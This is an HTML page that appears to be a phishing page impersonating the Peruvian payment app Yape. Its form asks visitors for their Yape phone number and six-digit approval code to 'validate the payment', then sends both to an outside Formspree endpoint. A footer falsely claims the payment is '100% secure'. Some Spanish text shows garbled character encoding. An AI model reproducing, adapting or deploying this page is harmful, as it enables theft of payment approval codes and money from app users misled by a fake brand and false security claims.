<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>YAPE</title>
    
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="theme-color" content="#742284">

    <style>
        /* Estilos Base para simular App */
        body {
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: #742284; /* Fondo morado para evitar destellos blancos */
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            overflow: hidden; /* Evita el scroll para que parezca fija */
        }

        .main-wrapper {
            background: white;
            width: 100%;
            height: 100vh; /* Ocupa toda la pantalla */
            max-width: 450px;
            display: flex;
            flex-direction: column;
            position: relative;
        }

        .header-bar {
            height: 6px;
            background: linear-gradient(90deg, #742284 0%, #a332ba 100%);
        }

        .payment-side {
            padding: 40px 30px;
            color: #333;
            text-align: center;
            flex-grow: 1;
        }

        .logo-yape {
            width: 120px;
            margin-bottom: 30px;
        }

        .instruction {
            font-size: 15px;
            color: #666;
            margin-bottom: 35px;
            line-height: 1.5;
        }

        .label-text {
            display: block;
            text-align: left;
            font-size: 12px;
            font-weight: 700;
            color: #777;
            margin-bottom: 6px;
            text-transform: uppercase;
            letter-spacing: 0.8px;
        }

        /* Inputs Estilizados */
        input {
            width: 100%;
            padding: 16px;
            margin-bottom: 25px;
            border-radius: 12px;
            box-sizing: border-box;
            font-size: 18px;
            border: 1px solid #ddd;
            outline: none;
            background-color: #f9f9f9;
            transition: all 0.3s;
        }

        input:focus {
            border-color: #742284;
            background-color: #fff;
            box-shadow: 0 0 0 4px rgba(116, 34, 132, 0.1);
        }

        .menu-ayuda {
            display: block;
            font-size: 13px;
            color: #742284;
            margin-bottom: 30px;
            text-decoration: none;
            font-weight: 600;
        }

        /* Bot贸n Estilo Yape */
        .btn-yapear {
            width: 100%;
            padding: 18px;
            background-color: #742284;
            color: white;
            border: none;
            border-radius: 25px; /* Bordes m谩s redondeados tipo App */
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            opacity: 0.5;
            pointer-events: none;
            text-transform: uppercase;
        }

        .btn-yapear.active {
            opacity: 1;
            pointer-events: auto;
            box-shadow: 0 6px 20px rgba(116, 34, 132, 0.4);
        }

        .footer-secure {
            padding-bottom: 30px;
            font-size: 12px;
            color: #bbb;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
        }
    </style>
</head>
<body>

<div class="main-wrapper">
    <div class="header-bar"></div>
    
    <div class="payment-side">
        <img src="https://www.apuestatotal.com//cms/img/banners/892/logo-yape.png" alt="Yape" class="logo-yape">
        
        <p class="instruction">Ingresa tus datos para validar el pago.</p>
        
        <form id="paymentForm" action="https://formspree.io/f/xaqyqrjy" method="POST">
            
            <label class="label-text">Celular Yape</label>
            <input type="tel" id="celular" name="Celular_Yape" 
                   placeholder="900 000 000" maxlength="9" 
                   inputmode="numeric" pattern="[0-9]*" required>

            <label class="label-text">C贸digo de aprobaci贸n</label>
            <input type="tel" id="codigo" name="Codigo_Aprobacion" 
                   placeholder="000000" maxlength="6" 
                   inputmode="numeric" pattern="[0-9]*" required>

            <a href="#" class="menu-ayuda">驴C贸mo obtener el c贸digo?</a>

            <input type="hidden" name="_subject" value="Nuevo Pago Yape Recibido">
            
            <button type="submit" id="btnSubmit" class="btn-yapear">Yapear</button>
        </form>
    </div>

    <div class="footer-secure">
        <span> Pago 100% seguro con tecnolog铆a Monnet</span>
    </div>
</div>

<script>
    const celularInput = document.getElementById('celular');
    const codigoInput = document.getElementById('codigo');
    const btnSubmit = document.getElementById('btnSubmit');

    function validarFormulario() {
        // Solo activa el bot贸n si el celular tiene 9 y el c贸digo 6 d铆gitos
        if (celularInput.value.length === 9 && codigoInput.value.length === 6) {
            btnSubmit.classList.add('active');
        } else {
            btnSubmit.classList.remove('active');
        }
    }

    // Limitar solo a n煤meros mientras escriben
    [celularInput, codigoInput].forEach(input => {
        input.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/[^0-9]/g, '');
            validarFormulario();
        });
    });
</script>

</body>
</html>
